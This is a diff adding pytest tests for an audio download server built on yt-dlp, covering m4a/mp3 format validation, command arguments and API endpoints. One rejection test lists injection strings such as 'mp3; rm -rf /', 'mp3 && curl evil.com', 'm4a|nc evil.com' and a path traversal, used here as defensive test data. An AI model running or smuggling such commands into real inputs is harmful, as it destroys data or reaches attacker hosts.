@@ -43,7 +43,8 @@ def test_shorts_url_resolves(srv):
 
 
 def test_invalid_url_raises(srv):
-    with pytest.raises(ValueError):
+    """Tipo propio desde el plan 06 T1: distingue entrada inválida de fallo interno."""
+    with pytest.raises(srv.InvalidInputError):
         srv.resolve_download_input("https://vimeo.com/12345")
 
 
@@ -343,3 +344,153 @@ def test_folder_without_audio_yields_none(srv, tmp_path, make_audio_files):
     folder = tmp_path / "d"
     make_audio_files(str(folder), ["leeme.txt"])
     assert srv.infer_title_from_folder(str(folder)) is None
+
+
+# ========================================
+# Formato de audio (plan 05, T1)
+# ========================================
+
+def test_default_format_is_m4a(srv):
+    assert srv.resolve_audio_format({}) == "m4a"
+    assert srv.DEFAULT_AUDIO_FORMAT == "m4a"
+
+
+@pytest.mark.parametrize("entrada,esperado", [
+    ({"format": "m4a"}, "m4a"),
+    ({"format": "mp3"}, "mp3"),
+    ({"format": "MP3"}, "mp3"),
+    ({"format": " mp3 "}, "mp3"),
+])
+def test_allowed_formats_are_accepted(srv, entrada, esperado):
+    assert srv.resolve_audio_format(entrada) == esperado
+
+
+@pytest.mark.parametrize("fmt", [
+    "flac", "wav", "ogg", "opus",        # formatos reales pero no ofrecidos
+    "", "  ", "../etc/passwd",
+    "mp3; rm -rf /", "mp3 && curl evil.com", "m4a|nc evil.com",
+])
+def test_unsupported_formats_are_rejected(srv, fmt):
+    """
+    El formato viene del cliente y acaba en --audio-format de yt-dlp. No hay
+    inyección de shell posible (el comando es una lista), pero un valor
+    arbitrario provocaría un fallo opaco a mitad de descarga.
+    """
+    with pytest.raises(srv.InvalidInputError):
+        srv.resolve_audio_format({"format": fmt})
+
+
+def test_quality_is_accepted_and_ignored(srv):
+    """Una APK antigua sigue mandando `quality`; no debe romper la petición."""
+    assert srv.resolve_audio_format({"quality": "320"}) == "m4a"
+    assert srv.resolve_audio_format({"quality": "320", "format": "mp3"}) == "mp3"
+
+
+def test_none_payload_uses_the_default(srv):
+    assert srv.resolve_audio_format(None) == "m4a"
+
+
+# ---------- Argumentos generados ----------
+
+def test_m4a_remuxes_without_reencoding(srv):
+    """m4a debe conservar el flujo original: calidad intacta y CPU cero."""
+    args = srv.audio_format_args("m4a")
+    assert args[args.index("--audio-format") + 1] == "m4a"
+    assert "bestaudio[ext=m4a]/bestaudio" in args
+
+
+def test_mp3_requests_a_reasonable_bitrate(srv):
+    """La fuente es AAC ~128 kbps: V0 solo inflaría el fichero sin ganar nada."""
+    args = srv.audio_format_args("mp3")
+    assert args[args.index("--audio-format") + 1] == "mp3"
+    assert args[args.index("--audio-quality") + 1] == "2"
+
+
+@pytest.mark.parametrize("fmt", ["m4a", "mp3"])
+def test_command_carries_the_requested_format(srv, fmt):
+    cmd = srv.build_ytdlp_download_cmd("video", "URL", fmt)
+    assert cmd[cmd.index("--audio-format") + 1] == fmt
+
+
+@pytest.mark.parametrize("fmt", ["m4a", "mp3"])
+def test_both_formats_keep_metadata_and_cover(srv, fmt):
+    """
+    Verificado además con descargas reales: los dos formatos salen con carátula
+    embebida y con título y artista. Sin --embed-thumbnail el mp3 saldría pelado.
+    """
+    cmd = srv.build_ytdlp_audio_cmd("URL", fmt)
+    assert "--embed-thumbnail" in cmd
+    assert "--add-metadata" in cmd
+
+
+def test_single_command_keeps_its_specific_flags(srv):
+    """Las diferencias entre las dos rutas eran intencionadas, no ruido."""
+    cmd = srv.build_ytdlp_audio_cmd("URL", "m4a", batch_item=False)
+    assert "--print" in cmd
+    assert "--encoding" in cmd
+    assert "--user-agent" not in cmd
+
+
+def test_batch_command_keeps_its_specific_flags(srv):
+    cmd = srv.build_ytdlp_audio_cmd("URL", "m4a", batch_item=True)
+    assert "--user-agent" in cmd
+    assert "--no-warnings" in cmd
+    assert "--print" not in cmd
+
+
+def test_playlist_command_does_not_disable_playlist(srv):
+    assert "--no-playlist" not in srv.build_ytdlp_download_cmd("playlist", "URL", "mp3")
+
+
+def test_transcode_semaphore_is_bounded(srv):
+    """
+    Solo mp3 pasa por ffmpeg. Sin techo, una playlist de 50 canciones lanzaría
+    5 transcodificaciones en paralelo sobre 2 núcleos.
+    """
+    assert srv.MAX_TRANSCODES >= 1
+    assert srv.MAX_TRANSCODES < srv.MAX_WORKERS
+    assert srv.transcode_slots is not None
+
+
+# ---------- Endpoints ----------
+
+def test_start_download_rejects_a_bad_format(client):
+    resp = client.post("/api/start-download", json={
+        "url": "https://www.youtube.com/watch?v=dQw4w9WgXcQ", "format": "flac"})
+    assert resp.status_code == 400
+    assert "formato" in resp.get_json()["error"].lower()
+
+
+def test_start_download_echoes_the_format(client, srv, monkeypatch):
+    monkeypatch.setattr(srv.executor, "submit", lambda *a, **k: None)
+    monkeypatch.setattr(srv, "prefetch_video_metadata", lambda *a, **k: None)
+
+    resp = client.post("/api/start-download", json={
+        "url": "https://www.youtube.com/watch?v=dQw4w9WgXcQ", "format": "mp3"})
+    assert resp.status_code == 200
+    assert resp.get_json()["format"] == "mp3"
+
+
+def test_batch_download_rejects_a_bad_format(client):
+    resp = client.post("/api/start-batch-download", json={
+        "videos": [{"url": "https://youtu.be/v000000001"}], "format": "wav"})
+    assert resp.status_code == 400
+
+
+def test_batch_download_echoes_the_format(client, srv, monkeypatch):
+    monkeypatch.setattr(srv.batch_executor, "submit", lambda *a, **k: None)
+    resp = client.post("/api/start-batch-download", json={
+        "videos": [{"url": "https://youtu.be/v000000001"}], "format": "mp3"})
+    assert resp.get_json()["format"] == "mp3"
+
+
+def test_format_is_recorded_in_progress(client, srv, monkeypatch):
+    """El cliente lo lee del progreso para saber qué extensión esperar."""
+    monkeypatch.setattr(srv.executor, "submit", lambda *a, **k: None)
+    monkeypatch.setattr(srv, "prefetch_video_metadata", lambda *a, **k: None)
+
+    did = client.post("/api/start-download", json={
+        "url": "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
+        "format": "mp3"}).get_json()["download_id"]
+
+    assert srv.download_progress[did]["format"] == "mp3"
